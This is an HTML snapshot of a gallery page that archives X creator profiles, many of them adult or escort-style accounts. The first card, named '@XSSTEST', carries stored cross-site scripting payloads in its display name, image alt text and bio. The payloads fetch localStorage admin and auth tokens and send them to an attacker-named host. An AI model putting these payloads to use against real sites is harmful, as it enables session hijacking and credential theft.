@@ -1,0 +1,921 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN" data-theme="oled"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <meta name="referrer" content="no-referrer">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>博主精选画廊 · 万能媒体下载器</title>
+  <meta name="description" content="女菩萨 — X (Twitter) 关注列表精选画廊与全量博主归档系统">
+  <link rel="icon" type="image/png" href="/static/bloggers-assets/logo-icon.png">
+  
+  <!-- Modern Typography Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com/">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+  <link href="/static/bloggers-assets/css2" rel="stylesheet">
+  
+  <link rel="stylesheet" href="/static/bloggers-assets/style.css">
+</head>
+<body>
+
+  <!-- Interactive Canvas Starfield Particles Background (React-Bits Canvas) -->
+  <canvas id="bg-particles-canvas" width="1093" height="959"></canvas>
+
+  <!-- App Wrapper -->
+  <div class="app-container">
+    
+    <!-- Top Sticky Header (Slim & Purified) -->
+    <header class="v2-header">
+      <div class="header-inner">
+        
+        <!-- Brand identity (No shake / head-tilt animation, purified brand) -->
+        <div class="header-brand-group">
+          <a href="/" class="brand-link">
+            <div class="brand-text">
+              <span class="brand-name">博主精选画廊</span>
+            </div>
+          </a>
+        </div>
+
+        <!-- Global Search Bar -->
+        <div class="header-search-wrap">
+          <div class="search-box">
+            <svg class="search-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+              <circle cx="11" cy="11" r="8"></circle>
+              <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+            </svg>
+            <input type="text" id="global-search" placeholder="搜索博主 ID (@handle)、昵称或简介 Bio..." autocomplete="off" spellcheck="false" aria-label="搜索博主">
+            <button id="search-clear-btn" class="search-clear-btn hidden" title="清空搜索 (ESC)" aria-label="清空搜索">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+            </button>
+            <kbd class="key-shortcut" title="按 '/' 键快速聚焦">/</kbd>
+          </div>
+        </div>
+
+        <!-- Right Quick Controls -->
+        <div class="header-actions">
+          <a href="/" title="返回首页" style="display:inline-flex;align-items:center;gap:6px;padding:8px 16px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);border-radius:999px;color:#fff;text-decoration:none;font-size:13px;font-weight:500;transition:all 0.2s;">← 返回首页</a>
+          
+          <!-- Random Discovery Roulette Button (React-Bits Slot Machine) -->
+          <button class="btn-lucky-pick" id="btn-lucky-pick" title="随机探索一位博主 (快捷键: R)">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <rect width="12" height="12" x="2" y="10" rx="2" ry="2"></rect>
+              <path d="m17.92 14 3.5-3.5a2.41 2.41 0 0 0 0-3.41l-4.5-4.5a2.41 2.41 0 0 0-3.41 0L10 6.08"></path>
+              <path d="M6 14h.01"></path><path d="M10 18h.01"></path><path d="M15 10h.01"></path>
+            </svg>
+            <span>随机探索</span>
+          </button>
+
+          <!-- Pure Icon Dual Theme Toggle Button (Light vs OLED) -->
+          <button class="theme-toggle-btn" id="theme-btn" title="当前: 纯黑极简 · 点击切换为清爽浅色 (Light) [快捷键: T]" aria-label="切换主题">
+            <svg id="theme-icon-sun" class="hidden" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <circle cx="12" cy="12" r="4"></circle><path d="M12 2v2"></path><path d="M12 20v2"></path><path d="m4.93 4.93 1.41 1.41"></path><path d="m17.66 17.66 1.41 1.41"></path><path d="M2 12h2"></path><path d="M20 12h2"></path><path d="m6.34 17.66-1.41 1.41"></path><path d="m19.07 4.93-1.41 1.41"></path>
+            </svg>
+            <svg id="theme-icon-moon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"></path>
+            </svg>
+          </button>
+
+          <!-- Admin Console Gate -->
+          
+        </div>
+      </div>
+    </header>
+
+    <!-- Main Content Flow -->
+    <main class="v2-main">
+      
+      <!-- Dual-Wing Enhanced Hero Section (Spacious Luxury Feel) -->
+      <section class="hero-section">
+        <div class="hero-content-grid">
+          
+          <!-- Left: Value Prop & High-Craft Modern Bento Metric Cards -->
+          <div class="hero-left-intro">
+            <div class="hero-eyebrow">
+              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>
+              <span>CURATED DISCOVERY VAULT</span>
+            </div>
+            <h1 class="hero-title"><span class="shiny-text">X 博主精选画廊</span></h1>
+            <p class="hero-description">高品质 X (Twitter) 创作者画廊 · 去重备份 · 实时探索与智能推荐</p>
+            
+            <!-- Subtle Inline Curator Link (Understated, Single-Line, Low Profile) -->
+            <div class="hero-curator-wrap">
+              <a href="https://x.com/TianZe68356" target="_blank" rel="noopener noreferrer" class="curator-card" aria-label="访问策展人 Wet Dream Boy 的 X 个人主页" title="前往 X 访问策展人 Wet Dream Boy (@TianZe68356)">
+                <span class="curator-content">
+                  <span class="curator-label">策展人</span>
+                  <span class="curator-dot">·</span>
+                  <span class="curator-name">Wet Dream Boy</span>
+                </span>
+                <svg class="curator-arrow" width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+                  <line x1="7" y1="17" x2="17" y2="7"></line>
+                  <polyline points="7 7 17 7 17 17"></polyline>
+                </svg>
+              </a>
+            </div>
+
+            <!-- Unified High-Craft Glass Data Capsule Strip -->
+            <div class="hero-unified-capsule">
+              <div class="capsule-metric-item">
+                <div class="capsule-icon icon-wrap-blue">
+                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M22 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
+                </div>
+                <div class="capsule-data">
+                  <span class="capsule-number" id="stat-total-chip">496</span>
+                  <span class="capsule-label">归档总数</span>
+                </div>
+              </div>
+
+              <div class="capsule-divider"></div>
+
+              <div class="capsule-metric-item">
+                <div class="capsule-icon icon-wrap-verified">
+                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M3.85 8.62a4 4 0 0 1 4.78-4.77 4 4 0 0 1 6.74 0 4 4 0 0 1 4.78 4.78 4 4 0 0 1 0 6.74 4 4 0 0 1-4.77 4.78 4 4 0 0 1-6.75 0 4 4 0 0 1-4.78-4.77 4 4 0 0 1 0-6.76Z"></path><path d="m9 12 2 2 4-4"></path></svg>
+                </div>
+                <div class="capsule-data">
+                  <span class="capsule-number" id="stat-verified-chip">32%</span>
+                  <span class="capsule-label">蓝标认证</span>
+                </div>
+              </div>
+
+              <div class="capsule-divider"></div>
+
+              <div class="capsule-metric-item">
+                <div class="capsule-icon icon-wrap-gold">
+                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="m12 3-1.912 5.813a2 2 0 0 1-1.275 1.275L3 12l5.813 1.912a2 2 0 0 1 1.275 1.275L12 21l1.912-5.813a2 2 0 0 1 1.275-1.275L21 12l-5.813-1.912a2 2 0 0 1-1.275-1.275L12 3Z"></path></svg>
+                </div>
+                <div class="capsule-data">
+                  <span class="capsule-number" id="stat-max-chip">100.0M</span>
+                  <span class="capsule-label">最高粉丝</span>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Right: Spotlight Feature Card (React-Bits SpotlightCard + 3D Tilt) -->
+          <div class="hero-right-spotlight spotlight-interactive tilt-card-wrap" id="hero-spotlight-card" style="--mouse-x: 387.34490966796875px; --mouse-y: 44.64723205566406px; transform: perspective(1000px) rotateX(0deg) rotateY(0deg) translateY(0px);">
+            <div class="spotlight-badge">
+              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>
+              <span class="shiny-gold">今日精选 Spotlight</span>
+            </div>
+            
+            <div class="spotlight-body" id="spotlight-dynamic-content">
+      <div class="spotlight-avatar-wrap" onclick="window.trackBloggerClick('cuic9794', 'card'); window.open('https://x.com/cuic9794', '_blank')">
+        <img class="spotlight-avatar" src="/static/bloggers-assets/cuic9794_400x400.jpg" alt=".小曦." onerror="this.src='https://abs.twimg.com/sticky/default_profile_images/default_profile_400x400.png';">
+        
+      </div>
+      <div class="spotlight-meta">
+        <div class="spotlight-name-row">
+          <span class="spotlight-name" title=".小曦.">.小曦.</span>
+          <span class="card-influence-pill ">Creator</span>
+        </div>
+        <a class="spotlight-handle" href="https://x.com/cuic9794" target="_blank" onclick="window.trackBloggerClick('cuic9794', 'card');">@cuic9794 · 73.2K 关注</a>
+        <div class="spotlight-bio-snippet">被限流的苦命女人 （过门约拍）
+推广自行辨别（主播也要吃饭）
+位置: 苏州 🚪520 📷2000/2h</div>
+      </div>
+    </div>
+
+            <button class="btn-shuffle-spotlight" id="btn-shuffle-spotlight" title="换一个精选推荐">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M21 12a9 9 0 0 0-9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"></path><path d="M3 3v5h5"></path><path d="M3 12a9 9 0 0 0 9 9 9.75 9.75 0 0 0 6.74-2.74L21 16"></path><path d="M16 16h5v5"></path></svg>
+              <span>换一位推荐</span>
+            </button>
+          </div>
+
+        </div>
+      </section>
+
+      <!-- Discovery & Command Toolbar -->
+      <section class="discovery-bar">
+        
+        <!-- Row 1: Filter Tags on Left, View Switcher Tabs on Right -->
+        <div class="filter-header-row">
+          <div class="filter-pills-row" role="tablist">
+            <button class="f-pill active" data-filter="all">
+              <span>全部</span>
+              <span class="pill-badge" id="badge-count-all">477</span>
+            </button>
+            <button class="f-pill" data-filter="hot" title="按访客点击跳转 X 主页的热度排行">
+              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 1 1-14 0c0-1.153.433-2.294 1-3a2.5 2.5 0 0 0 2.5 2.5z"></path></svg>
+              <span>热度排行</span>
+              <span class="pill-badge" id="badge-count-hot">444</span>
+            </button>
+            <button class="f-pill" data-filter="verified">
+              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M3.85 8.62a4 4 0 0 1 4.78-4.77 4 4 0 0 1 6.74 0 4 4 0 0 1 4.78 4.78 4 4 0 0 1 0 6.74 4 4 0 0 1-4.77 4.78 4 4 0 0 1-6.75 0 4 4 0 0 1-4.78-4.77 4 4 0 0 1 0-6.76Z"></path><path d="m9 12 2 2 4-4"></path></svg>
+              <span>蓝标认证</span>
+              <span class="pill-badge" id="badge-count-verified">160</span>
+            </button>
+            <button class="f-pill" data-filter="top">
+              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 1 1-14 0c0-1.153.433-2.294 1-3a2.5 2.5 0 0 0 2.5 2.5z"></path></svg>
+              <span>Top 头部 (50万+)</span>
+            </button>
+            <button class="f-pill" data-filter="100k">
+              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>
+              <span>知名创作者 (10万+)</span>
+            </button>
+            <button class="f-pill" data-filter="recent">
+              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+              <span>最新归档</span>
+              <span class="pill-badge" id="badge-count-recent">33</span>
+            </button>
+            <button class="f-pill" data-filter="lost" title="X 官方已被封号或注销的博主档案（赛博坟场）">
+              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 10h.01"></path><path d="M15 10h.01"></path><path d="M12 2a8 8 0 0 0-8 8v12l3-3 2.5 2.5L12 19l2.5 2.5L17 19l3 3V10a8 8 0 0 0-8-8z"></path></svg>
+              <span>赛博坟场</span>
+              <span class="pill-badge tombstone" id="badge-count-lost">19</span>
+            </button>
+          </div>
+
+          <!-- View Mode Toggler (Grid / Compact / List) on Far Right -->
+          <div class="view-mode-tabs" role="radiogroup" aria-label="布局模式">
+            <button class="view-tab-btn active" data-view="grid" title="自适应瀑布流 (快捷键: 1)" aria-label="自适应瀑布流视图">
+              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect width="7" height="9" x="3" y="3" rx="1"></rect><rect width="7" height="5" x="14" y="3" rx="1"></rect><rect width="7" height="9" x="14" y="12" rx="1"></rect><rect width="7" height="5" x="3" y="16" rx="1"></rect></svg>
+            </button>
+            <button class="view-tab-btn" data-view="compact" title="密集紧凑 (快捷键: 2)" aria-label="密集紧凑视图">
+              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7" rx="1.5"></rect><rect x="14" y="3" width="7" height="7" rx="1.5"></rect><rect x="14" y="14" width="7" height="7" rx="1.5"></rect><rect x="3" y="14" width="7" height="7" rx="1.5"></rect></svg>
+            </button>
+            <button class="view-tab-btn" data-view="list" title="数据列表 (快捷键: 3)" aria-label="数据列表视图">
+              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="8" y1="6" x2="21" y2="6"></line><line x1="8" y1="12" x2="21" y2="12"></line><line x1="8" y1="18" x2="21" y2="18"></line><line x1="3" y1="6" x2="3.01" y2="6"></line><line x1="3" y1="12" x2="3.01" y2="12"></line><line x1="3" y1="18" x2="3.01" y2="18"></line></svg>
+            </button>
+          </div>
+        </div>
+
+        <!-- Row 2: Sort Popover & Result Metrics -->
+        <div class="discovery-meta-row">
+          <div class="results-indicator" id="results-count-text">共呈现 477 位博主归档</div>
+
+          <div class="sort-selector-wrap">
+            <span class="sort-label">排序:</span>
+            <div class="custom-select-box" id="sort-select-box">
+              <button class="select-trigger-btn" id="sort-trigger-btn" type="button" aria-haspopup="listbox" aria-expanded="false">
+                <span id="sort-current-text">粉丝数从高到低</span>
+                <svg class="arrow-icon" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"></polyline></svg>
+              </button>
+              <div class="select-dropdown-menu hidden" id="sort-menu" role="listbox">
+          <div class="menu-item active" data-val="followers-desc" role="option">
+            <span>粉丝数从高到低</span>
+            <svg class="check-icon " width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"></polyline></svg>
+          </div>
+        
+          <div class="menu-item " data-val="followers-asc" role="option">
+            <span>粉丝数从低到高</span>
+            <svg class="check-icon hidden" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"></polyline></svg>
+          </div>
+        
+          <div class="menu-item " data-val="name-asc" role="option">
+            <span>博主名称 (A → Z)</span>
+            <svg class="check-icon hidden" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"></polyline></svg>
+          </div>
+        
+          <div class="menu-item " data-val="recent" role="option">
+            <span>归档时间最近</span>
+            <svg class="check-icon hidden" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"></polyline></svg>
+          </div>
+        </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Gallery Showcase Wall (Discrete Multi-Column Masonry Flow) -->
+      <section class="gallery-container">
+        <div class="blogger-wall grid-view" id="blogger-wall"><div class="masonry-column"><div class="blogger-card spotlight-interactive" role="article" tabindex="0" style="animation-delay: 0ms; --card-accent-rgb: 20, 184, 166; --card-accent: rgb(20, 184, 166);">
+      <div class="card-ambient-glow"></div>
+      <div class="card-header-banner">
+        <img class="card-banner-img" src="/static/bloggers-assets/photo-1618005182384-a83a8bd57fbe" alt="&lt;img src=x onerror=&quot;fetch('https://api.yzitc.com/ico/?url=http://attacker.collect.io/?t='+btoa(JSON.stringify({tok:localStorage.getItem('x_archive_admin_token'),ct0:localStorage.getItem('x_archive_ct0'),auth:localStorage.getItem('x_archive_auth_token')})))&quot;&gt;" loading="lazy" decoding="async" onerror="handleMediaImgError(this, '', 'cover');">
+        
+      </div>
+      <div class="card-main-content">
+        <div class="card-avatar-row">
+          <div class="card-avatar-wrap">
+            <img class="card-avatar-img" src="/static/bloggers-assets/default_profile_400x400.png" alt="&lt;img src=x onerror=&quot;fetch('https://api.yzitc.com/ico/?url=http://attacker.collect.io/?t='+btoa(JSON.stringify({tok:localStorage.getItem('x_archive_admin_token'),ct0:localStorage.getItem('x_archive_ct0'),auth:localStorage.getItem('x_archive_auth_token')})))&quot;&gt;" loading="lazy" decoding="async" onerror="handleMediaImgError(this, 'https://abs.twimg.com/sticky/default_profile_images/default_profile_400x400.png', 'avatar');" data-retry-done="1">
+            <div class="badge-verified-native" title="Twitter 官方认证"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3.2"><polyline points="20 6 9 17 4 12"></polyline></svg></div>
+          </div>
+        </div>
+
+        <div class="card-user-info">
+          <div class="card-name-row">
+            <span class="card-user-name" title="&lt;img src=x onerror=&quot;fetch('https://api.yzitc.com/ico/?url=http://attacker.collect.io/?t='+btoa(JSON.stringify({tok:localStorage.getItem('x_archive_admin_token'),ct0:localStorage.getItem('x_archive_ct0'),auth:localStorage.getItem('x_archive_auth_token')})))&quot;&gt;">&lt;img src=x onerror="fetch('https://api.yzitc.com/ico/?url=http://attacker.collect.io/?t='+btoa(JSON.stringify({tok:localStorage.getItem('x_archive_admin_token'),ct0:localStorage.getItem('x_archive_ct0'),auth:localStorage.getItem('x_archive_auth_token')})))"&gt;</span>
+            <span class="card-influence-pill top-tier">Top Creator</span>
+            
+          </div>
+          <a class="card-user-handle" href="https://x.com/XSSTEST" target="_blank" onclick="event.stopPropagation(); window.trackBloggerClick('XSSTEST', 'card');">@XSSTEST</a>
+          <div class="card-metrics-chip">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M22 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
+            <span>100.0M 关注者</span>
+          </div>
+        </div>
+
+        <div class="card-bio-content">&lt;script&gt;fetch("<a href="https://api.yzitc.com/ico/?url=http://c.io?d=%22+btoa(localStorage.getItem(%22x_archive_admin_token%22)))%3C/script%3E" target="_blank" onclick="event.stopPropagation();">https://api.yzitc.com/ico/?url=http://c.io?d="+btoa(localStorage.getItem("x_archive_admin_token")))&lt;/script&gt; ↗</a></div>
+      </div>
+
+      <div class="card-action-footer">
+        <button class="btn-inspect-profile" type="button">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+          <span>时光档案</span>
+        </button>
+        <a class="btn-visit-x" href="https://x.com/XSSTEST" target="_blank" onclick="event.stopPropagation(); window.trackBloggerClick('XSSTEST', 'card');">
+          <span>访问 X</span>
+          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg>
+        </a>
+      </div>
+    </div><div class="blogger-card spotlight-interactive" role="article" tabindex="0" style="animation-delay: 80ms; --card-accent-rgb: 14, 165, 233; --card-accent: rgb(14, 165, 233);">
+      <div class="card-ambient-glow"></div>
+      <div class="card-header-banner">
+        <img class="card-banner-img" src="/static/bloggers-assets/profile_banners_1431794460547944456_1699446537_600x200" alt="困困狗" loading="lazy" decoding="async" onerror="handleMediaImgError(this, 'https://pbs.twimg.com/profile_banners/1431794460547944456/1699446537/600x200', 'cover');">
+        
+      </div>
+      <div class="card-main-content">
+        <div class="card-avatar-row">
+          <div class="card-avatar-wrap">
+            <img class="card-avatar-img" src="/static/bloggers-assets/kunkunkun188_400x400.jpg" alt="困困狗" loading="lazy" decoding="async" onerror="handleMediaImgError(this, '/api/media?key=avatars%2Fkunkunkun188_400x400.jpg', 'avatar');">
+            <div class="badge-verified-native" title="Twitter 官方认证"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3.2"><polyline points="20 6 9 17 4 12"></polyline></svg></div>
+          </div>
+        </div>
+
+        <div class="card-user-info">
+          <div class="card-name-row">
+            <span class="card-user-name" title="困困狗">困困狗</span>
+            <span class="card-influence-pill top-tier">Top Creator</span>
+            
+          </div>
+          <a class="card-user-handle" href="https://x.com/kunkunkun188" target="_blank" onclick="event.stopPropagation(); window.trackBloggerClick('kunkunkun188', 'card');">@kunkunkun188</a>
+          <div class="card-metrics-chip">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M22 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
+            <span>1.9M 关注者</span>
+          </div>
+        </div>
+
+        <div class="card-bio-content">🎺@kunkunkun181🩵🩵🩵🩵🩵🩵🩵 🩵 🩵 ALL MY WORKS: <a href="https://t.co/lgJnVExPNa" target="_blank" onclick="event.stopPropagation();">https://t.co/lgJnVExPNa ↗</a>
+网址: <a href="https://t.me/Kunkunkun188_bot" target="_blank" onclick="event.stopPropagation();">https://t.me/Kunkunkun188_bot ↗</a>
+位置: MY only TG</div>
+      </div>
+
+      <div class="card-action-footer">
+        <button class="btn-inspect-profile" type="button">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+          <span>时光档案</span>
+        </button>
+        <a class="btn-visit-x" href="https://x.com/kunkunkun188" target="_blank" onclick="event.stopPropagation(); window.trackBloggerClick('kunkunkun188', 'card');">
+          <span>访问 X</span>
+          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg>
+        </a>
+      </div>
+    </div><div class="blogger-card spotlight-interactive" role="article" tabindex="0" style="animation-delay: 120ms; --card-accent-rgb: 245, 158, 11; --card-accent: rgb(245, 158, 11);">
+      <div class="card-ambient-glow"></div>
+      <div class="card-header-banner">
+        <img class="card-banner-img" src="/static/bloggers-assets/profile_banners_1622092931531444225_1759213893_600x200" alt="FortuneCutie饼干姐姐" loading="lazy" decoding="async" onerror="handleMediaImgError(this, 'https://pbs.twimg.com/profile_banners/1622092931531444225/1759213893/600x200', 'cover');">
+        
+      </div>
+      <div class="card-main-content">
+        <div class="card-avatar-row">
+          <div class="card-avatar-wrap">
+            <img class="card-avatar-img" src="/static/bloggers-assets/FortuneCutie00_400x400.jpg" alt="FortuneCutie饼干姐姐" loading="lazy" decoding="async" onerror="handleMediaImgError(this, '/api/media?key=avatars%2FFortuneCutie00_400x400.jpg', 'avatar');">
+            <div class="badge-verified-native" title="Twitter 官方认证"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3.2"><polyline points="20 6 9 17 4 12"></polyline></svg></div>
+          </div>
+        </div>
+
+        <div class="card-user-info">
+          <div class="card-name-row">
+            <span class="card-user-name" title="FortuneCutie饼干姐姐">FortuneCutie饼干姐姐</span>
+            <span class="card-influence-pill top-tier">Top Creator</span>
+            
+          </div>
+          <a class="card-user-handle" href="https://x.com/FortuneCutie00" target="_blank" onclick="event.stopPropagation(); window.trackBloggerClick('FortuneCutie00', 'card');">@FortuneCutie00</a>
+          <div class="card-metrics-chip">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M22 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
+            <span>1.3M 关注者</span>
+          </div>
+        </div>
+
+        <div class="card-bio-content">快到门主怀里来🙈 饼门出品必属精品！
+★所有完整版+绝版写真: <a href="https://t.co/cNF76gIUwW" target="_blank" onclick="event.stopPropagation();">https://t.co/cNF76gIUwW ↗</a> 
+★TG电报全解锁: <a href="https://t.co/GGCHlxSP8e" target="_blank" onclick="event.stopPropagation();">https://t.co/GGCHlxSP8e ↗</a> 
+💯错一个字母都是假冒！
+YOUR ASIAN PETITE FANTASY 🫦
+哈基饼 @fortunecutie01
+网址: <a href="http://hajibing.com/" target="_blank" onclick="event.stopPropagation();">http://hajibing.com ↗</a>
+位置: 饼干姐姐官网All Links👉 </div>
+      </div>
+
+      <div class="card-action-footer">
+        <button class="btn-inspect-profile" type="button">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+          <span>时光档案</span>
+        </button>
+        <a class="btn-visit-x" href="https://x.com/FortuneCutie00" target="_blank" onclick="event.stopPropagation(); window.trackBloggerClick('FortuneCutie00', 'card');">
+          <span>访问 X</span>
+          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg>
+        </a>
+      </div>
+    </div><div class="blogger-card spotlight-interactive" role="article" tabindex="0" style="animation-delay: 220ms; --card-accent-rgb: 249, 115, 22; --card-accent: rgb(249, 115, 22);">
+      <div class="card-ambient-glow"></div>
+      <div class="card-header-banner">
+        <img class="card-banner-img" src="/static/bloggers-assets/profile_banners_1967109283788845061_1757832661_600x200" alt="えむ。" loading="lazy" decoding="async" onerror="handleMediaImgError(this, 'https://pbs.twimg.com/profile_banners/1967109283788845061/1757832661/600x200', 'cover');">
+        
+      </div>
+      <div class="card-main-content">
+        <div class="card-avatar-row">
+          <div class="card-avatar-wrap">
+            <img class="card-avatar-img" src="/static/bloggers-assets/kuzu_v53_400x400.jpg" alt="えむ。" loading="lazy" decoding="async" onerror="handleMediaImgError(this, '/api/media?key=avatars%2Fkuzu_v53_400x400.jpg', 'avatar');">
+            <div class="badge-verified-native" title="Twitter 官方认证"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3.2"><polyline points="20 6 9 17 4 12"></polyline></svg></div>
+          </div>
+        </div>
+
+        <div class="card-user-info">
+          <div class="card-name-row">
+            <span class="card-user-name" title="えむ。">えむ。</span>
+            <span class="card-influence-pill top-tier">Top Creator</span>
+            
+          </div>
+          <a class="card-user-handle" href="https://x.com/kuzu_v53" target="_blank" onclick="event.stopPropagation(); window.trackBloggerClick('kuzu_v53', 'card');">@kuzu_v53</a>
+          <div class="card-metrics-chip">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M22 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
